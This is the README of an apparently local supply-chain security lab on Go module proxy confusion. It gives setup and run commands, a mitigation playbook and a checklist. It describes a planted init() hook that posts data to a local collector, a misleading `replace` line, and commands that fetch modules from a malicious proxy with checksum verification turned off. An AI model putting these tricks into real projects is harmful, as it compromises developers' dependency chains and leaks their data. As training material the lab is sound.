# Scenario 28: Go module proxy confusion

Almost every lab here is npm or PyPI. This one is Go. Issue #23 stays the ecosystem bucket (Rust, Maven later). 28 is the first slice: GOPROXY, sumdb, `replace`.

You need **Go on PATH** for the happy path (`go run`). `./install.sh` does not install a toolchain. Docker labs use a Go image. If `go` is missing, `node infrastructure/goproxy-client.js` still talks to the mock proxy so smoke can pass.


## Table of Contents

<div class="doc-toc">

- [Two knobs](#two-knobs)
- [Setup](#setup)
- [Run the lab](#run-the-lab)
- [Mitigation Playbook](#mitigation-playbook)
- [Success](#success)
- [Related](#related)

</div>

---
## Two knobs

1. `GOPROXY=http://127.0.0.1:3028` so `go get` / `go run` fetches the bad zip.
2. `go.mod.replace-trap` has `replace example.com/corp/widget => ../attacker-module` that looks like a local pin and is not.

`GOSUMDB=off` is the "I shot myself" demo. Leave sumdb on as the mitigation. The mock does not speak a real checksum database; the README is honest about that.

Payload: `init()` in `attacker-module/widget.go` POSTs a marker to `http://127.0.0.1:3028/collect` when `TESTBENCH_MODE=enabled`. No `evil.com`.

## Setup

```bash
cd scenarios/28-go-module-confusion
export TESTBENCH_MODE=enabled
./setup.sh
```

`setup.sh` zips the attacker module into the GOPROXY store. It does not require Go for that step.

## Run the lab

```bash
export TESTBENCH_MODE=enabled
node infrastructure/mock-server.js
cd victim-module
GOPROXY=http://127.0.0.1:3028,off GOSUMDB=off GONOSUMDB='*' go run -mod=mod .
curl -s http://127.0.0.1:3028/captured-data
```

Then open `go.mod.replace-trap` and compare it to `go.mod`. The replace line is the second story.

## Mitigation Playbook

- Point `GOPROXY` at a proxy you actually run. Do not paste an unknown host.
- Keep `GOSUMDB` on. Treat `GOSUMDB=off` as an incident, not a convenience flag.
- Review every `replace` in `go.mod` like a new dependency.
- Vendor or pin through a verified mirror in CI.
- Diff `go.sum` after every bump and fail the build on surprise hashes.

## Success

- [ ] Capture from `init()` (or the Node GOPROXY client if Go is absent).
- [ ] You can explain GOPROXY vs replace vs sumdb without mixing them.
- [ ] Global installer was not quietly changed to apt-get golang.

## Related

02 dependency confusion · 11 registry mirror
